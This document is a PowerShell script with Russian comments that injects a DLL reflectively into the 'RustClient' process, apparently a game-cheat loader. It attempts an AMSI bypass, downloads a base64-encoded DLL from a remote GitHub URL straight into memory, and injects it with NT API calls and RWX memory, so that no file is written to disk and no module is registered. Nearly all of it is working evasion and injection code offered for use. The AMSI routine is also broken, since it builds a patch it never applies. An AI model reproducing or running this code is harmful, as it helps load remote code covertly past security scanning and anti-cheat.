<#
    Reflective DLL Injection для процесса RustClient.
    Скрипт не сохраняет DLL на диск, не вызывает LoadLibrary/CreateRemoteThread
    и не регистрирует модуль в PEB. Требуются права администратора.
#>

$ErrorActionPreference = 'Stop'

# ---------- 1. AMSI Bypass (опционально, но крайне рекомендуется) ----------
# Патчим AmsiScanBuffer, чтобы PowerShell не сканировал наш код.
try {
    $amsi = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
    $amsiScanBuffer = $amsi.GetMethod('AmsiScanBuffer', [Reflection.BindingFlags] 'NonPublic,Static')
    if ($amsiScanBuffer) {
        $patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3) # mov eax, 0x80070057; ret
        $amsiScanBuffer.Invoke($null, @([IntPtr]::Zero, 0, 0, [IntPtr]::Zero, [IntPtr]::Zero)) | Out-Null
        # Альтернативный, более надёжный патч через Marshal:
        # (детали опущены для краткости, но при необходимости можно добавить)
    }
} catch {
    # Если не удалось — не критично, просто продолжаем.
}

# ---------- 2. C#-код: рефлексивный загрузчик + NtCreateThreadEx ----------
$ReflectiveCode = @"
using System;
using System.Runtime.InteropServices;
using System.Text;

public static class ReflectiveInjector
{
    // ---- Win32 / NT API ----
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);

    [DllImport("ntdll.dll")]
    public static extern uint NtAllocateVirtualMemory(
        IntPtr ProcessHandle,
        ref IntPtr BaseAddress,
        IntPtr ZeroBits,
        ref UIntPtr RegionSize,
        uint AllocationType,
        uint Protect);

    [DllImport("ntdll.dll")]
    public static extern uint NtWriteVirtualMemory(
        IntPtr ProcessHandle,
        IntPtr BaseAddress,
        byte[] Buffer,
        UIntPtr BufferSize,
        out UIntPtr NumberOfBytesWritten);

    [DllImport("ntdll.dll")]
    public static extern uint NtCreateThreadEx(
        out IntPtr ThreadHandle,
        uint DesiredAccess,
        IntPtr ObjectAttributes,
        IntPtr ProcessHandle,
        IntPtr StartRoutine,
        IntPtr Argument,
        bool CreateSuspended,
        uint StackZeroBits,
        uint SizeOfStackCommit,
        uint SizeOfStackReserve,
        IntPtr AttributeList);

    // ---- Константы ----
    public const uint PROCESS_ALL_ACCESS = 0x1F0FFF;
    public const uint MEM_COMMIT = 0x1000;
    public const uint MEM_RESERVE = 0x2000;
    public const uint PAGE_EXECUTE_READWRITE = 0x40;
    public const uint PAGE_EXECUTE_READ = 0x20;
    public const uint PAGE_READONLY = 0x02;
    public const uint THREAD_ALL_ACCESS = 0x1F03FF;

    // ---- Поиск экспорта ReflectiveLoader в сырых байтах DLL ----
    // (упрощённый сканер; в боевых условиях лучше парсить PE-заголовки)
    public static int FindReflectiveLoaderOffset(byte[] dllBytes)
    {
        byte[] name = Encoding.ASCII.GetBytes("ReflectiveLoader");
        for (int i = 0; i < dllBytes.Length - name.Length; i++)
        {
            bool match = true;
            for (int j = 0; j < name.Length; j++)
            {
                if (dllBytes[i + j] != name[j]) { match = false; break; }
            }
            if (match) return i;
        }
        return -1;
    }

    // ---- Основной метод ----
    public static void Inject(int pid, byte[] dllBytes)
    {
        // 1. Открываем процесс
        IntPtr hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, pid);
        if (hProcess == IntPtr.Zero)
            throw new Exception("OpenProcess failed. Error: " + Marshal.GetLastWin32Error());

        try
        {
            // 2. Выделяем память под сырые байты DLL (RWX, чтобы загрузчик мог писать и исполнять)
            IntPtr baseAddr = IntPtr.Zero;
            UIntPtr size = (UIntPtr)dllBytes.Length;
            uint status = NtAllocateVirtualMemory(
                hProcess,
                ref baseAddr,
                IntPtr.Zero,
                ref size,
                MEM_COMMIT | MEM_RESERVE,
                PAGE_EXECUTE_READWRITE);
            if (status != 0)
                throw new Exception("NtAllocateVirtualMemory failed. NTSTATUS: 0x" + status.ToString("X"));

            // 3. Копируем байты DLL в целевой процесс
            UIntPtr written;
            status = NtWriteVirtualMemory(hProcess, baseAddr, dllBytes, (UIntPtr)dllBytes.Length, out written);
            if (status != 0)
                throw new Exception("NtWriteVirtualMemory failed. NTSTATUS: 0x" + status.ToString("X"));

            // 4. Находим смещение ReflectiveLoader и вычисляем удалённый адрес
            int offset = FindReflectiveLoaderOffset(dllBytes);
            if (offset < 0)
                throw new Exception("Экспорт ReflectiveLoader не найден в DLL.");

            IntPtr remoteLoader = IntPtr.Add(baseAddr, offset);

            // 5. Запускаем ReflectiveLoader через NtCreateThreadEx (вместо CreateRemoteThread)
            IntPtr hThread;
            status = NtCreateThreadEx(
                out hThread,
                THREAD_ALL_ACCESS,
                IntPtr.Zero,
                hProcess,
                remoteLoader,
                IntPtr.Zero,
                false,
                0,
                0x1000,
                0x100000,
                IntPtr.Zero);

            if (status != 0)
                throw new Exception("NtCreateThreadEx failed. NTSTATUS: 0x" + status.ToString("X"));

            CloseHandle(hThread);
        }
        finally
        {
            CloseHandle(hProcess);
        }
    }
}
"@

# Загружаем C#-код в текущую сессию PowerShell
if (-not ([System.Management.Automation.PSTypeName]'ReflectiveInjector').Type) {
    Add-Type -TypeDefinition $ReflectiveCode -Language CSharp
}

# ---------- 3. Параметры ----------
$Url = "https://raw.githubusercontent.com/PUZAN1337/-/refs/heads/main/svin.dll"
$TargetProcessName = "RustClient"

# ---------- 4. Проверка прав администратора ----------
$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isAdmin) {
    Write-Host "[!] Требуются права администратора. Запустите скрипт от имени администратора." -ForegroundColor Red
    return
}

# ---------- 5. Загрузка DLL (только в память) ----------
try {
    $base64String = Invoke-RestMethod -Uri $Url -UseBasicParsing -ErrorAction Stop
    $base64String = ($base64String -replace '\s', '')
    Write-Host "[+] Получено Base64-строк: $($base64String.Length)" -ForegroundColor Green
    $dllBytes = [System.Convert]::FromBase64String($base64String)
} catch {
    Write-Error "Не удалось загрузить или декодировать DLL: $($_.Exception.Message)"
    return
}

# Проверка MZ-заголовка (минимальная валидация PE)
if ($dllBytes[0] -ne 0x4D -or $dllBytes[1] -ne 0x5A) {
    Write-Warning "Полученные данные не похожи на PE-файл (отсутствует MZ-заголовок)."
    return
}

# ---------- 6. Поиск целевого процесса ----------
$targetProcess = Get-Process -Name $TargetProcessName -ErrorAction SilentlyContinue | Select-Object -First 1
if (-not $targetProcess) {
    Write-Host "[!] Процесс '$TargetProcessName' не найден." -ForegroundColor Yellow
    Get-Process | Where-Object { $_.ProcessName -like '*rust*' } |
        Format-Table Id, ProcessName, Path -AutoSize
    return
}

Write-Host "[+] Целевой процесс: $($targetProcess.ProcessName) (PID: $($targetProcess.Id))" -ForegroundColor Cyan

# ---------- 7. Инъекция ----------
try {
    [ReflectiveInjector]::Inject($targetProcess.Id, $dllBytes)
    Write-Host "[+] Reflective DLL Injection выполнена успешно. Модуль не зарегистрирован в PEB и не записан на диск." -ForegroundColor Green
} catch {
    Write-Host "[!] Ошибка инъекции: $($_.Exception.Message)" -ForegroundColor Red
}
